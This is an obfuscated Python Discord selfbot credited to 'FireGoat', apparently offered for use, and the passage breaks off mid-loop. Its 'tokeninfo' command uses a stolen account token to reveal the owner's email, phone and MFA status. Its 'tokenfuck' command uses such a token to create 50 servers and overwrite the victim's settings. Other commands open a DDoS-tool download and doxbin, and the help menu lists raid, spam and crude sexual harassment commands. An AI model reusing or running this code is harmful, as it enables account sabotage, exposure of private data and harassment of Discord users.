import os #line:1
import time #line:3
import requests #line:5
import subprocess #line:7
import tkinter #line:9
from tkinter import messagebox #line:11
import sys #line:13
import hashlib #line:15
from itertools import cycle #line:17
import discord ,ctypes ,json ,os ,webbrowser ,requests ,datetime ,urllib ,time ,string ,random ,asyncio ,aiohttp #line:19
from discord .ext import commands #line:21
from colorama import Fore ,Back ,Style #line:23
from selenium import webdriver #line:25
import threading #line:27
import subprocess ,requests ,time ,os #line:31
VERSION =""#line:34
TOTAL_COMMANDS =""#line:36
TOTAL_LINES =""#line:38
import discord ,ctypes ,json ,os ,webbrowser ,requests ,datetime ,urllib ,time ,string ,random ,asyncio ,aiohttp #line:42
from discord .ext import commands #line:44
from colorama import Fore ,Back ,Style #line:46
from selenium import webdriver #line:48
import threading #line:50
import subprocess ,requests ,time ,os #line:54
hwid =subprocess .check_output ('wmic csproduct get uuid').decode ().split ('\n')[1 ].strip ()#line:58
import socket #line:62
hostname =socket .gethostname ()#line:66
local_ip =socket .gethostbyname (hostname )#line:68
start_time =datetime .datetime .utcnow ()#line:70
languages ={'hu':'Hungarian, Hungary','nl':'Dutch, Netherlands','no':'Norwegian, Norway','pl':'Polish, Poland','pt-BR':'Portuguese, Brazilian, Brazil','ro':'Romanian, Romania','fi':'Finnish, Finland','sv-SE':'Swedish, Sweden','vi':'Vietnamese, Vietnam','tr':'Turkish, Turkey','cs':'Czech, Czechia, Czech Republic','el':'Greek, Greece','bg':'Bulgarian, Bulgaria','ru':'Russian, Russia','uk':'Ukranian, Ukraine','th':'Thai, Thailand','zh-CN':'Chinese, China','ja':'Japanese','zh-TW':'Chinese, Taiwan','ko':'Korean, Korea'}#line:114
locales =["da","de","en-GB","en-US","es-ES","fr","hr","it","lt","hu","nl","no","pl","pt-BR","ro","fi","sv-SE","vi","tr","cs","el","bg","ru","uk","th","zh-CN","ja","zh-TW","ko"]#line:150
m_numbers =[":one:",":two:",":three:",":four:",":five:",":six:"]#line:168
m_offets =[(-1 ,-1 ),(0 ,-1 ),(1 ,-1 ),(-1 ,0 ),(1 ,0 ),(-1 ,1 ),(0 ,1 ),(1 ,1 )]#line:190
with open ("config.json")as f :#line:194
    config =json .load (f )#line:196
TOKEN =config .get ("token")#line:200
PREFIX =config .get ("prefix")#line:202
def ready ():#line:208
    print (f"""

                                TITOLO FIGO
                                               

                               	By {Fore.RED}[{Fore.RESET}FireGoat{Fore.RED}]{Fore.RESET}

                                ════════════════════════════════════════════════════

                                Prefix {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}                                               

                                Servers{Fore.RED}[{Fore.RESET}{len(FireGoat.guilds)}{Fore.RED}]{Fore.RESET}                      

                                Friends{Fore.RED}[{Fore.RESET}{len(FireGoat.user.friends)}{Fore.RED}]{Fore.RESET}   

                                User{Fore.RED}[{Fore.RESET}{FireGoat.user.name}{Fore.RED}]{Fore.RESET}     

                                ════════════════════════════════════════════════════ 

                                Help commands:

                                {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}help

                                ════════════════════════════════════════════════════ 

                                Clear the console :  {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}clear

    """+Fore .RESET )#line:237
def Nitro ():#line:242
    O0000O000000O0O00 ="".join (random .choices (string .ascii_letters +string .digits ,k =16 ))#line:244
    return f"https://discord.gift/{O0000O000000O0O00}"#line:246
def RandomColor ():#line:250
    O0O000O0O0O00O0O0 =discord .Color (random .randint (0x000000 ,0xFFFFFF ))#line:252
    return O0O000O0O0O00O0O0 #line:254
def RandString ():#line:259
    return "".join (random .choice (string .ascii_letters +string .digits )for O0OO0000000OO0O0O in range (random .randint (4 ,4 )))#line:261
def _O00O0OO000OOOOOOO (OO0OO00000OOO0O00 ):#line:264
    O0000OOOO0O00O000 =random .randint (0 ,25 )#line:265
    OO0O0O00O0OOO00O0 =random .randint (0 ,120 )#line:266
    O0OO00OOOOO0O0O0O =random .randint (0 ,100 )#line:267
    OO00OOOOOO0OO0OOO =random .randint (0 ,100 )#line:268
    OO0OO0OO00OOOO0OO =random .randint (0 ,100 )#line:269
    OOO0OOOO00OOO00OO =random .randint (0 ,100 )#line:270
    return f'{OO0OO00000OOO0O00} is {OO00OOOOOO0OO0OOO}% gay :rainbow_flag:\n{mention} is {O0OO00OOOOO0O0O0O}% hot :hot_face:\n{mention} is {OO0O0O00O0OOO00O0} inches tall :night_with_stars:\n{mention} is {OO0OO0OO00OOOO0OO}% ugly :face_vomiting:\n{mention}\'s dick is {O0000OOOO0O00O000} inches :triangular_ruler:\n{mention} is {OOO0OOOO00OOO00OO}% horny :lips:'#line:271
pn ='0123456789'#line:274
def _OO00OO0OO00OO0000 (O0OOO0OOO0O000OO0 ):#line:277
    OOOOO0OOOOOO000OO =random .randint (0 ,100 )#line:278
    return f'{O0OOO0OOO0O000OO0} is {OOOOO0OOOOOO000OO}% gay :rainbow_flag:'#line:279
client =commands .Bot (command_prefix =PREFIX ,self_bot =True )#line:288
FireGoat =client #line:290
client .remove_command ('help')#line:292
@FireGoat .event #line:296
async def on_message_edit (O00000OO0O0O0OOO0 ,OOO0O0OOO0O0OOOO0 ):#line:298
    await FireGoat .process_commands (OOO0O0OOO0O0OOOO0 )#line:300
@FireGoat .event #line:304
async def on_connect ():#line:306
    os .system ("mode con: cols=120 lines=21")#line:308
    ctypes .windll .kernel32 .SetConsoleTitleW (f"selfbot_FireGoat. Selfbot | | Logged In As: {FireGoat.user.name}")#line:310
    ready ()#line:312
@FireGoat .group (invoke_without_command =True )#line:324
async def help (OO0O000O0OOO00OOO ):#line:326
    O0O00O0OO0OOO00O0 =discord .Embed (title ="🌀 selfbot created by FireGoat",color =RandomColor ())#line:328
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Fun commands |",value ="8ball, slot, poll, hastebin, rainbowrole, ascii, slap, cum, hug, kiss, tickle, meme, nitro, expose, gayrate, embed, phcomment, tweet, trumptweet, clyde, typing, rembed, hastebin")#line:332
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Raid commands |",value ="fullnuke, fulldelete, banall, rolecreate, channelcreate, channeldelete, roledelete, group-leaver")#line:334
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Spam commands |",value ="txtspam, blankspam, numberspam, emojispam, crashspam, embedspam, memespam, hentaispam, pinguser, silentping")#line:336
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Extra commands |",value ="spoiler, streaming, playing, listening, watching, tinyurl")#line:338
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Helpful commands |",value ="purge, guildicon, guildinfo, whois, av, copy, uptime, ping, clear, delhook, kick, ban")#line:340
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Hacking |",value ="dox, tokeninfo, tokenfuck, DDoS")#line:342
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Porn |",value ="hentai, pussy, tits, waifu, fox, hentaigif, pussygif, cumgif, kunigif, spank")#line:344
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Server builder |",value ="serverbuilder")#line:346
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Credits |",value ="Made by FireGoat")#line:348
    O0O00O0OO0OOO00O0 .add_field (name ="|🌀 Website |",value ="||https://shoppy.gg/@Aniell4||")#line:350
    await OO0O000O0OOO00OOO .message .delete ()#line:358
    await OO0O000O0OOO00OOO .send (embed =O0O00O0OO0OOO00O0 )#line:360
    await OO0O000O0OOO00OOO .message .delete ()#line:368
    await OO0O000O0OOO00OOO .send (embed =O0O00O0OO0OOO00O0 )#line:370
@FireGoat .command ()#line:374
async def uptime (O00O00O0OOOOO0O0O ):#line:376
    await O00O00O0OOOOO0O0O .message .delete ()#line:378
    O00000OOOOO0000OO =datetime .datetime .utcnow ()#line:380
    OO0O000O0OOOO000O =O00000OOOOO0000OO -start_time #line:382
    O00O0O0OOOOO0O00O ,O0O00O0O0OOO0OOOO =divmod (int (OO0O000O0OOOO000O .total_seconds ()),3600 )#line:384
    OO0OO0OO0OOOOO00O ,OOO0OOO00000O0000 =divmod (O0O00O0O0OOO0OOOO ,60 )#line:386
    OO0O00OO0O000OO00 ,O00O0O0OOOOO0O00O =divmod (O00O0O0OOOOO0O00O ,24 )#line:388
    if OO0O00OO0O000OO00 :#line:390
        OO0O0OOOO00O0O0O0 ="`{d}d, {h}h, {m}m, {s}s`"#line:392
    else :#line:394
        OO0O0OOOO00O0O0O0 ="`{h}h, {m}m, {s}s`"#line:396
    O000OOOO0O0000000 =OO0O0OOOO00O0O0O0 .format (d =OO0O00OO0O000OO00 ,h =O00O0O0OOOOO0O00O ,m =OO0OO0OO0OOOOO00O ,s =OOO0OOO00000O0000 )#line:398
    await O00O00O0OOOOO0O0O .send (O000OOOO0O0000000 )#line:400
@FireGoat .command ()#line:407
async def gayrate (OO0O0O0OOOO00OOOO ,OO00O0O0O0O00O00O :discord .Member =None ):#line:408
    await OO0O0O0OOOO00OOOO .message .delete ()#line:409
    O000000O0OOOO0000 =discord .Embed (title ='Gay Rate',color =0xFFFAFA ,description =f'{_OO00OO0OO00OO0000(OO00O0O0O0O00O00O.mention)}',timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:411
    await OO0O0O0OOOO00OOOO .send (embed =O000000O0OOOO0000 )#line:412
@FireGoat .command ()#line:414
async def expose (O000OOO0OOOOO0OOO ,O00O000O00000OO0O :discord .Member =None ):#line:415
    await O000OOO0OOOOO0OOO .message .delete ()#line:416
    OOO0OOO0OO0OO0OO0 =discord .Embed (title ='Exposed',color =0xFFFAFA ,description =f'{_O00O0OO000OOOOOOO(O00O000O00000OO0O.mention)}',timestamp =datetime .datetime .utcfromtimestamp (time .time ()))#line:418
    await O000OOO0OOOOO0OOO .send (embed =OOO0OOO0OO0OO0OO0 )#line:419
@FireGoat .command (name ='8ball')#line:422
async def _OO000OO0O0O00O00O (O0O00O0O000OOO00O ,*,question ):#line:424
    O0OOOOOO00O000O0O =['Per come la vedo io, sì.','Chiedi un altra volta più tardi.','Meglio non dirtelo ora.','Non è possibile prevedere ora.','Concentrati e chiedi di nuovo.','Non ci contare.','È certo.','È decisamente così.','Più probabilmente.','La mia risposta è no.','Le mie fonti dicono di no.','Prospettive non così buone.','Prospettive buone.','Rispondi confuso, riprova.','I segni indicano sì.','Molto dubbioso.','Senza dubbio.','Sì.','Sì, ​​sicuramente.','Puoi fare affidamento su di esso.']#line:468
    OOOO0OOOO0O00O0OO =random .choice (O0OOOOOO00O000O0O )#line:470
    OO00OOO0O00O000OO =discord .Embed (color =RandomColor ())#line:472
    OO00OOO0O00O000OO .add_field (name ="**Question:**",value =f"```{question}```",inline =False )#line:474
    OO00OOO0O00O000OO .add_field (name ="**Answer:**",value =f"```{OOOO0OOOO0O00O0OO}```",inline =False )#line:476
    OO00OOO0O00O000OO .set_author (name ="8 Ball Machine",icon_url ="https://cdn.nekos.life/8ball/Absolutely.png")#line:478
    await O0O00O0O000OOO00O .message .delete ()#line:480
    await O0O00O0O000OOO00O .send (embed =OO00OOO0O00O000OO )#line:482
@FireGoat .command (aliases =['slots','bet',"slotmachine"])#line:486
async def slot (O0OOOO0OO0O00O0O0 ):#line:488
    await O0OOOO0OO0O00O0O0 .message .delete ()#line:490
    OO0OO0OOOOOO000OO ="🍎🍊🍐🍋🍉🍇🍓🍒"#line:492
    OOOO0O0OOOOO0OOOO =random .choice (OO0OO0OOOOOO000OO )#line:494
    O000OOOO0O0O0OO0O =random .choice (OO0OO0OOOOOO000OO )#line:496
    O0OO00O0OOO0O0O00 =random .choice (OO0OO0OOOOOO000OO )#line:498
    OOOO0O0O000OOOOO0 =f"**[ {OOOO0O0OOOOO0OOOO} {O000OOOO0O0O0OO0O} {O0OO00O0OOO0O0O00} ]\n{O0OOOO0OO0O00O0O0.author.name}**,"#line:500
    if OOOO0O0OOOOO0OOOO ==O000OOOO0O0O0OO0O ==O0OO00O0OOO0O0O00 :#line:502
        await O0OOOO0OO0O00O0O0 .send (embed =discord .Embed .from_dict ({"title":"Slot machine","description":f"{OOOO0O0O000OOOOO0} All matchings, you won!"}))#line:506
    elif (OOOO0O0OOOOO0OOOO ==O000OOOO0O0O0OO0O )or (OOOO0O0OOOOO0OOOO ==O0OO00O0OOO0O0O00 )or (O000OOOO0O0O0OO0O ==O0OO00O0OOO0O0O00 ):#line:508
        await O0OOOO0OO0O00O0O0 .send (embed =discord .Embed .from_dict ({"title":"Slot machine","description":f"{OOOO0O0O000OOOOO0} 2 in a row, you won!"}))#line:512
    else :#line:514
        await O0OOOO0OO0O00O0O0 .send (embed =discord .Embed .from_dict ({"title":"Slot machine","description":f"{OOOO0O0O000OOOOO0} No match, you lost"}))#line:518
@FireGoat .command (aliases =['rainbowrole'])#line:522
async def rainbow (O0OO00O000O00OO0O ,*,role ):#line:524
    await O0OO00O000O00OO0O .message .delete ()#line:526
    role =discord .utils .get (O0OO00O000O00OO0O .guild .roles ,name =role )#line:528
    while True :#line:530
        try :#line:532
            await role .edit (role =role ,colour =RandomColor ())#line:534
            await asyncio .sleep (3 )#line:536
        except :#line:538
            break #line:540
@FireGoat .command (aliases =["jerkoff","ejaculate","orgasm"])#line:546
async def cum (OO0O00OOOOOO00O0O ):#line:548
    await OO0O00OOOOOO00O0O .message .delete ()#line:550
    OO00OO0000OO0O000 =await OO0O00OOOOOO00O0O .send ('''

            :ok_hand:            :smile:

   :eggplant: :zzz: :necktie: :eggplant: 

                   :oil:     :nose:

                 :zap: 8=:punch:=D 

             :trumpet:      :eggplant:''')#line:562
    await asyncio .sleep (0.5 )#line:564
    await OO00OO0000OO0O000 .edit (content ='''

                      :ok_hand:            :smiley:

   :eggplant: :zzz: :necktie: :eggplant: 

                   :oil:     :nose:

                 :zap: 8==:punch:D 

             :trumpet:      :eggplant:  

     ''')#line:578
    await asyncio .sleep (0.5 )#line:580
    await OO00OO0000OO0O000 .edit (content ='''

                      :ok_hand:            :grimacing:

   :eggplant: :zzz: :necktie: :eggplant: 

                   :oil:     :nose:

                 :zap: 8=:punch:=D 

             :trumpet:      :eggplant:  

     ''')#line:594
    await asyncio .sleep (0.5 )#line:596
    await OO00OO0000OO0O000 .edit (content ='''

                      :ok_hand:            :persevere:

   :eggplant: :zzz: :necktie: :eggplant: 

                   :oil:     :nose:

                 :zap: 8==:punch:D 

             :trumpet:      :eggplant:   

     ''')#line:610
    await asyncio .sleep (0.5 )#line:612
    await OO00OO0000OO0O000 .edit (content ='''

                      :ok_hand:            :confounded:

   :eggplant: :zzz: :necktie: :eggplant: 

                   :oil:     :nose:

                 :zap: 8=:punch:=D 

             :trumpet:      :eggplant: 

     ''')#line:626
    await asyncio .sleep (0.5 )#line:628
    await OO00OO0000OO0O000 .edit (content ='''

                       :ok_hand:            :tired_face:

   :eggplant: :zzz: :necktie: :eggplant: 

                   :oil:     :nose:

                 :zap: 8==:punch:D 

             :trumpet:      :eggplant:    

             ''')#line:642
    await asyncio .sleep (0.5 )#line:644
    await OO00OO0000OO0O000 .edit (contnet ='''

                       :ok_hand:            :weary:

   :eggplant: :zzz: :necktie: :eggplant: 

                   :oil:     :nose:

                 :zap: 8=:punch:= D:sweat_drops:

             :trumpet:      :eggplant:        

     ''')#line:658
    await asyncio .sleep (0.5 )#line:660
    await OO00OO0000OO0O000 .edit (content ='''

                       :ok_hand:            :dizzy_face:

   :eggplant: :zzz: :necktie: :eggplant: 

                   :oil:     :nose:

                 :zap: 8==:punch:D :sweat_drops:

             :trumpet:      :eggplant:                 :sweat_drops:

     ''')#line:674
    await asyncio .sleep (0.5 )#line:676
    await OO00OO0000OO0O000 .edit (content ='''

                       :ok_hand:            :drooling_face:

   :eggplant: :zzz: :necktie: :eggplant: 

                   :oil:     :nose:

                 :zap: 8==:punch:D :sweat_drops:

             :trumpet:      :eggplant:                 :sweat_drops:

     ''')#line:690
@FireGoat .command ()#line:694
async def ascii (O0OO000000O0O0OO0 ,*,text ):#line:696
    await O0OO000000O0O0OO0 .message .delete ()#line:698
    OO0O0000O0OO0O000 =requests .get (f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text #line:700
    if len ("```"+OO0O0000O0OO0O000 +"```")>2000 :#line:702
        return #line:704
    await O0OO000000O0O0OO0 .send (f"```{OO0O0000O0OO0O000}```")#line:706
@FireGoat .command ()#line:710
async def slap (OO0O000OOO0OO00OO ,O0OOOO00O0O0O0000 :discord .Member ):#line:712
    OOOO000OOOO0O00O0 =requests .get ("https://nekos.life/api/v2/img/slap")#line:714
    OO00O0OO0O00OO0O0 =OOOO000OOOO0O00O0 .json ()#line:716
    OO00OO0OOO0O00O0O =discord .Embed (description =f"**{OO0O000OOO0OO00OO.author.mention} Slaps {O0OOOO00O0O0O0000.mention}**",color =RandomColor ())#line:718
    OO00OO0OOO0O00O0O .set_image (url =OO00O0OO0O00OO0O0 ["url"])#line:720
    await OO0O000OOO0OO00OO .message .delete ()#line:722
    await OO0O000OOO0OO00OO .send (embed =OO00OO0OOO0O00O0O )#line:724
@FireGoat .command ()#line:728
async def hug (OOOO0OOO00O00O0O0 ,OOOOO00O00OOO0OOO :discord .Member ):#line:730
    O00O0O00O0O0O000O =requests .get ("https://nekos.life/api/v2/img/hug")#line:732
    OO0000O0O0OOO0OO0 =O00O0O00O0O0O000O .json ()#line:734
    O0OO0O00000OO0O00 =discord .Embed (description =f"**{OOOO0OOO00O00O0O0.author.mention} Hugs {OOOOO00O00OOO0OOO.mention}**",color =RandomColor ())#line:736
    O0OO0O00000OO0O00 .set_image (url =OO0000O0O0OOO0OO0 ["url"])#line:738
    await OOOO0OOO00O00O0O0 .message .delete ()#line:740
    await OOOO0OOO00O00O0O0 .send (embed =O0OO0O00000OO0O00 )#line:742
@FireGoat .command ()#line:746
async def whois (O0O00OOO0OOO00OOO ,*,user :discord .Member =None ):#line:748
    await O0O00OOO0OOO00OOO .message .delete ()#line:750
    if user is None :#line:752
        user =O0O00OOO0OOO00OOO .author #line:754
    if isinstance (O0O00OOO0OOO00OOO .message .channel ,discord .Guild ):#line:756
        O00O0OOO00O00OO00 ="%a, %d %b %Y %I:%M %p"#line:758
        O000O000OOO00OOO0 =discord .Embed (description =user .mention )#line:760
        O000O000OOO00OOO0 .set_author (name =str (user ),icon_url =user .avatar_url )#line:762
        O000O000OOO00OOO0 .set_thumbnail (url =user .avatar_url )#line:764
        O000O000OOO00OOO0 .add_field (name ="Registered",value =user .created_at .strftime (O00O0OOO00O00OO00 ))#line:766
        O000O000OOO00OOO0 .add_field (name ="Joined",value =user .joined_at .strftime (O00O0OOO00O00OO00 ))#line:768
        O0OOOO0O000OO0O00 =sorted (O0O00OOO0OOO00OOO .guild .members ,key =lambda OOOOOOO00O0O00000 :OOOOOOO00O0O00000 .joined_at )#line:770
        O000O000OOO00OOO0 .add_field (name ="Join position",value =str (O0OOOO0O000OO0O00 .index (user )+1 ))#line:772
        if len (user .roles )>1 :#line:774
            OOO00O00O0OOO0O00 =' '.join ([O00O0OO000OOOO0OO .mention for O00O0OO000OOOO0OO in user .roles ][1 :])#line:776
            O000O000OOO00OOO0 .add_field (name ="Roles [{}]".format (len (user .roles )-1 ),value =OOO00O00O0OOO0O00 ,inline =False )#line:778
        OO0OOOO0O0OOO0OOO =', '.join ([str (O00O0OOO0000OOO00 [0 ]).replace ("_"," ").title ()for O00O0OOO0000OOO00 in user .guild_permissions if O00O0OOO0000OOO00 [1 ]])#line:780
        O000O000OOO00OOO0 .add_field (name ="Permissions",value =OO0OOOO0O0OOO0OOO ,inline =False )#line:782
        O000O000OOO00OOO0 .set_footer (text ='ID: '+str (user .id ))#line:784
        return await O0O00OOO0OOO00OOO .send (embed =O000O000OOO00OOO0 )#line:786
    else :#line:788
        O00O0OOO00O00OO00 ="%a, %d %b %Y %I:%M %p"#line:790
        O000O000OOO00OOO0 =discord .Embed (description =user .mention )#line:792
        O000O000OOO00OOO0 .set_author (name =str (user ),icon_url =user .avatar_url )#line:794
        O000O000OOO00OOO0 .set_thumbnail (url =user .avatar_url )#line:796
        O000O000OOO00OOO0 .add_field (name ="Created",value =user .created_at .strftime (O00O0OOO00O00OO00 ))#line:798
        O000O000OOO00OOO0 .set_footer (text ='ID: '+str (user .id ))#line:800
        return await O0O00OOO0OOO00OOO .send (embed =O000O000OOO00OOO0 )#line:802
@FireGoat .command ()#line:806
async def kiss (O00O00O0O00O0O000 ,O00000O00OOOOO0OO :discord .Member ):#line:808
    O0OO00O00OO00O00O =requests .get ("https://nekos.life/api/v2/img/kiss")#line:810
    O0OOO0O0OOO0O0O00 =O0OO00O00OO00O00O .json ()#line:812
    O00O00O00000OO0O0 =discord .Embed (description =f"**{O00O00O0O00O0O000.author.mention} Kisses {O00000O00OOOOO0OO.mention}**",color =RandomColor ())#line:814
    O00O00O00000OO0O0 .set_image (url =O0OOO0O0OOO0O0O00 ["url"])#line:816
    await O00O00O0O00O0O000 .message .delete ()#line:818
    await O00O00O0O00O0O000 .send (embed =O00O00O00000OO0O0 )#line:820
@FireGoat .command ()#line:824
async def meme (O00OOOO0O000O000O ):#line:826
    OO000O00O000O0O0O =requests .get ("https://some-random-api.ml/meme").json ()#line:828
    OO0OOOO0OOO0OOO0O =discord .Embed (color =RandomColor ())#line:830
    OO0OOOO0OOO0OOO0O .set_author (name ="Here Is The Meme You Requested",icon_url ="https://freepngimg.com/thumb/internet_meme/3-2-troll-face-meme-png-thumb.png")#line:832
    OO0OOOO0OOO0OOO0O .set_image (url =str (OO000O00O000O0O0O ["image"]))#line:834
    await O00OOOO0O000O000O .message .delete ()#line:836
    await O00OOOO0O000O000O .send (embed =OO0OOOO0OOO0OOO0O )#line:838
@FireGoat .command ()#line:842
async def nitro (OOOOOO00O0OO0000O ):#line:844
    await OOOOOO00O0OO0000O .message .delete ()#line:846
    await OOOOOO00O0OO0000O .send (Nitro ())#line:848
@FireGoat .command ()#line:862
async def DDoS (O000O0OOO0O00000O ):#line:864
    await O000O0OOO0O00000O .message .delete ()#line:866
    O00OO00OOOO000O00 =discord .Embed (color =RandomColor ())#line:868
    O00OO00OOOO000O00 .set_author (name ="Here is your DDos Tool")#line:870
    await O000O0OOO0O00000O .send (embed =O00OO00OOOO000O00 )#line:872
    await os .system ('start https://mega.nz/file/WHwmAIDD#1sefOtMYZobevkKQs6FNH1rPYAkZuiounJEm9N4HcBk')#line:874
@FireGoat .command ()#line:878
async def dox (O000O000O0000OO00 ):#line:880
    await O000O000O0000OO00 .message .delete ()#line:882
    OO0OO00000OO0OO0O =discord .Embed (color =RandomColor ())#line:884
    OO0OO00000OO0OO0O .set_author (name ="Here is your doxer")#line:886
    await O000O000O0000OO00 .send (embed =OO0OO00000OO0OO0O )#line:888
    await os .system ('start https://doxbin.org')#line:890
@FireGoat .command (aliases =['tokinfo','tdox'])#line:894
async def tokeninfo (OO0OO0OOO00O0O000 ,_O0O0OO00O00O0000O ):#line:896
    await OO0OO0OOO00O0O000 .message .delete ()#line:898
    OO0O0OOOOOO000OO0 ={'Authorization':_O0O0OO00O00O0000O ,'Content-Type':'application/json'}#line:906
    try :#line:908
        OOOO0O0O0OO0OO00O =requests .get ('https://canary.discordapp.com/api/v6/users/@me',headers =OO0O0OOOOOO000OO0 )#line:910
        OOOO0O0O0OO0OO00O =OOOO0O0O0OO0OO00O .json ()#line:912
        O00OO00O0OOO0O00O =OOOO0O0O0OO0OO00O ['id']#line:914
        O0OO0OO0000O00OOO =OOOO0O0O0OO0OO00O ['locale']#line:916
        O000000OOO0000O0O =OOOO0O0O0OO0OO00O ['avatar']#line:918
        O0000O000OO00OOOO =languages .get (O0OO0OO0000O00OOO )#line:920
        O00OO00OO0O0000O0 =datetime .datetime .utcfromtimestamp (((int (O00OO00O0OOO0O00O )>>22 )+1420070400000 )/1000 ).strftime ('%d-%m-%Y %H:%M:%S UTC')#line:924
    except KeyError :#line:926
        OO0O0OOOOOO000OO0 ={'Authorization':"Bot "+_O0O0OO00O00O0000O ,'Content-Type':'application/json'}#line:934
        try :#line:936
            OOOO0O0O0OO0OO00O =requests .get ('https://canary.discordapp.com/api/v6/users/@me',headers =OO0O0OOOOOO000OO0 )#line:938
            OOOO0O0O0OO0OO00O =OOOO0O0O0OO0OO00O .json ()#line:940
            O00OO00O0OOO0O00O =OOOO0O0O0OO0OO00O ['id']#line:942
            O0OO0OO0000O00OOO =OOOO0O0O0OO0OO00O ['locale']#line:944
            O000000OOO0000O0O =OOOO0O0O0OO0OO00O ['avatar']#line:946
            O0000O000OO00OOOO =languages .get (O0OO0OO0000O00OOO )#line:948
            O00OO00OO0O0000O0 =datetime .datetime .utcfromtimestamp (((int (O00OO00O0OOO0O00O )>>22 )+1420070400000 )/1000 ).strftime ('%d-%m-%Y %H:%M:%S UTC')#line:952
            O00000OOO00O000OO =discord .Embed (description =f"Name: `{OOOO0O0O0OO0OO00O['username']}#{OOOO0O0O0OO0OO00O['discriminator']} ` **BOT**\nID: `{OOOO0O0O0OO0OO00O['id']}`\nEmail: `{OOOO0O0O0OO0OO00O['email']}`\nCreation Date: `{O00OO00OO0O0000O0}`")#line:956
            OOO000O0OOOOOOOO0 =[{'name':'Flags','value':OOOO0O0O0OO0OO00O ['flags']},{'name':'Local language','value':OOOO0O0O0OO0OO00O ['locale']+f"{O0000O000OO00OOOO}"},{'name':'Verified','value':OOOO0O0O0OO0OO00O ['verified']},]#line:966
            for OOOOO0O00O000000O in OOO000O0OOOOOOOO0 :#line:968
                if OOOOO0O00O000000O ['value']:#line:970
                    O00000OOO00O000OO .add_field (name =OOOOO0O00O000000O ['name'],value =OOOOO0O00O000000O ['value'],inline =False )#line:972
                    O00000OOO00O000OO .set_thumbnail (url =f"https://cdn.discordapp.com/avatars/{O00OO00O0OOO0O00O}/{O000000OOO0000O0O}")#line:974
            return await OO0OO0OOO00O0O000 .send (embed =O00000OOO00O000OO )#line:976
        except KeyError :#line:978
            await OO0OO0OOO00O0O000 .send ("Invalid token")#line:980
    O00000OOO00O000OO =discord .Embed (description =f"Name: `{OOOO0O0O0OO0OO00O['username']}#{OOOO0O0O0OO0OO00O['discriminator']}`\nID: `{OOOO0O0O0OO0OO00O['id']}`\nEmail: `{OOOO0O0O0OO0OO00O['email']}`\nCreation Date: `{O00OO00OO0O0000O0}`")#line:984
    O0OOO0O0OOO0OOOO0 ="None"#line:986
    if "premium_type"in OOOO0O0O0OO0OO00O :#line:988
        if OOOO0O0O0OO0OO00O ['premium_type']==2 :#line:990
            O0OOO0O0OOO0OOOO0 ="Nitro Premium"#line:992
        elif OOOO0O0O0OO0OO00O ['premium_type']==1 :#line:994
            O0OOO0O0OOO0OOOO0 ="Nitro Classic"#line:996
    OOO000O0OOOOOOOO0 =[{'name':'Phone','value':OOOO0O0O0OO0OO00O ['phone']},{'name':'Flags','value':OOOO0O0O0OO0OO00O ['flags']},{'name':'Local language','value':OOOO0O0O0OO0OO00O ['locale']+f"{O0000O000OO00OOOO}"},{'name':'MFA','value':OOOO0O0O0OO0OO00O ['mfa_enabled']},{'name':'Verified','value':OOOO0O0O0OO0OO00O ['verified']},{'name':'Nitro','value':O0OOO0O0OOO0OOOO0 },]#line:1012
    for OOOOO0O00O000000O in OOO000O0OOOOOOOO0 :#line:1014
        if OOOOO0O00O000000O ['value']:#line:1016
            O00000OOO00O000OO .add_field (name =OOOOO0O00O000000O ['name'],value =OOOOO0O00O000000O ['value'],inline =False )#line:1018
            O00000OOO00O000OO .set_thumbnail (url =f"https://cdn.discordapp.com/avatars/{O00OO00O0OOO0O00O}/{O000000OOO0000O0O}")#line:1020
    return await OO0OO0OOO00O0O000 .send (embed =O00000OOO00O000OO )#line:1022
@FireGoat .command (aliases =['tokenfucker','disable','crash'])#line:1028
async def tokenfuck (OO00O000OOO000OO0 ,_OO0OOOO0OO0O0OO00 ):#line:1030
    await OO00O000OOO000OO0 .message .delete ()#line:1032
    O00O0000000O00000 =discord .Embed (color =RandomColor ())#line:1034
    O00O0000000O00000 .set_author (name ="Token Succesfully Fucked")#line:1036
    await OO00O000OOO000OO0 .send (embed =O00O0000000O00000 )#line:1038
    O0O00OO00OO0O000O ={'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7','Content-Type':'application/json','Authorization':_OO0OOOO0OO0O0OO00 ,}#line:1048
    O00OO000OO0O000O0 =requests .Session ()#line:1050
    OOOOOOO0OO0OOOOO0 ={'theme':"light",'locale':"ja",'message_display_compact':False ,'inline_embed_media':False ,'inline_attachment_media':False ,'gif_auto_play':False ,'render_embeds':False ,'render_reactions':False ,'animate_emoji':False ,'convert_emoticons':False ,'enable_tts_command':False ,'explicit_content_filter':'0','status':"invisible"}#line:1080
    OOO0O0O000OOO0O00 ={'channels':None ,'icon':None ,'name':"selfbot_FireGoat Owns You",'region':"europe"}#line:1092
    for _OO00OO0O0OO00O0OO in range (50 ):#line:1094
        requests .post ('https://discordapp.com/api/v6/guilds',headers =O0O00OO00OO0O000O ,json =OOO0O0O000OOO0O00 )#line:1096
    while True :#line:1098
        try :#line:1100
            O00OO000OO0O000O0 .patch ("https://canary.discordapp.com/api/v6/users/@me/settings",headers =O0O00OO00OO0O000O ,json =OOOOOOO0OO0OOOOO0 )#line:1102
        except Exception as OOOOO0O0OOO0OOO00 :#line:1104
            print (f"{Fore.RED}[ERROR]: {Fore.YELLOW}{OOOOO0O0OOO0OOO00}"+Fore .RESET )#line:1106
        else :#line:1108
            break #line:1110
    OOO00000O0O000O0O =cycle (["light","dark"])#line:1112
    O0O0000O0000O000O =cycle (["dnd"])#line:1114
    while True :#line:1116
